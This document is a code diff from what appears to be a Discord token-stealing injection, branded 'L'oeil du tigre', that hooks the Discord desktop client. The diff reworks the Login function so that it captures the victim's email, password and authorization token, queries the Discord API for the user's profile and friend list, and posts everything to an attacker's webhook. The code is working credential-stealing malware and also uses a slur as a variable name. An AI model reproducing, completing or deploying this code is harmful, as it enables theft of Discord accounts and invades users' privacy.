@@ -131,96 +131,94 @@ function GetBadges(flags) {
 }
 
 
-function GetFriends() {
-    window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info4) => {
-        
-        function totalFriends() {
-            var f = JSON.parse(info4)
-            const r = f.filter((user) => {
-
-                return user.type == 1
-            })
-            return r.length
-        }
-
-        function CalcFriends() {
-            var f = JSON.parse(info4)
-            const r = f.filter((user) => {
-                return user.type == 1
-            })
-            var gay = "";
-            for (z of r) {
-                var b = GetBadges(z.user.public_flags)
-                if (b != "") {
-                    gay += b + ` ${z.user.username}:hash:${z.user.discriminator}\n`
-                }
-            }
-            if (gay == "") {
-                gay = "No Rare Friends"
-            }
-            return gay
-        }
-    })
-}
-
-
 
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText;`, !0).then((info) => {
-        const json = JSON.parse(info);
-        var params = {
-            username: "L'oeil du tigre",
-            content: "",
-            avatar_url: "https://media.discordapp.net/attachments/888797635799040090/940609597964697620/CATS.gif",
-            embeds: [
-                {
-                    "color": 16578294,
-                    "fields": [
-                        {
-                            "name": "**Account Info**",
-                            "value": `Email: ${email} - Password: ${password}`,
-                            "inline": true
-                        },
-                        {
-                            "name": "**Token**",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        },
-                        {
-                          "name": "**Amis**",
-                          "value": `test`,
-                          "inline": false
-                        },
-                        {
-                            "name": "**Badges**",
-                            "value": `${GetBadges(json.flags)} / ${GetNitro(json.premium_type)}`,
-                            "inline": true
-                        }
-                    ],
-                    "author": {
-                        "name": json.username + "#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    },
-                    "footer": {
-                        "text": "© L'oeil du tigre - 2022"
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText;`, !0).then((info) => {
+            window.webContents.executeJavaScript(`
+                var xmlHttp = new XMLHttpRequest();
+                xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+                xmlHttp.setRequestHeader("Authorization", "${token}");
+                xmlHttp.send( null );
+                xmlHttp.responseText`, !0).then((info4) => {
+
+                    function totalFriends() {
+                        var f = JSON.parse(info4)
+                        const r = f.filter((user) => {
+            
+                            return user.type == 1
+                        })
+                        return r.length
                     }
-                }
-            ]
+
+                    function CalcFriends() {
+                        var f = JSON.parse(info4)
+                        const r = f.filter((user) => {
+                            return user.type == 1
+                        })
+                        var gay = "";
+                        for (z of r) {
+                            var b = GetBadges(z.user.public_flags)
+                            if (b != "") {
+                                gay += b + ` ${z.user.username}:hash:${z.user.discriminator}\n`
+                            }
+                        }
+                        if (gay == "") {
+                            gay = "No Rare Friends"
+                        }
+                        return gay
+                    }
+
+                    const json = JSON.parse(info);
+                    var params = {
+                        username: "L'oeil du tigre",
+                        content: "",
+                        avatar_url: "https://media.discordapp.net/attachments/888797635799040090/940609597964697620/CATS.gif",
+                        embeds: [
+                            {
+                                "color": 16578294,
+                                "fields": [
+                                    {
+                                        "name": "**Account Info**",
+                                        "value": `Email: ${email} - Password: ${password}`,
+                                        "inline": true
+                                    },
+                                    {
+                                        "name": "**Token**",
+                                        "value": `\`${token}\``,
+                                        "inline": false
+                                    },
+                                    {
+                                    "name": "**Amis**",
+                                    "value": `test`,
+                                    "inline": false
+                                    },
+                                    {
+                                    "name": "**Badges**",
+                                    "value": `${GetBadges(json.flags)} / ${GetNitro(json.premium_type)}`,
+                                    "inline": true
+                                    }
+                                ],
+                                "author": {
+                                    "name": json.username + "#" + json.discriminator + "・" + json.id,
+                                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                                },
+                                "footer": {
+                                    "text": "© L'oeil du tigre - 2022"
+                                }
+                            }
+                        ]
+                    }
+                    SendToWebhook(JSON.stringify(params))
+                })
+            })
         }
-        SendToWebhook(JSON.stringify(params))
-    })
-}
+
 
     function ChangePassword(oldpassword, newpassword, token) {
         const window = BrowserWindow.getAllWindows()[0];
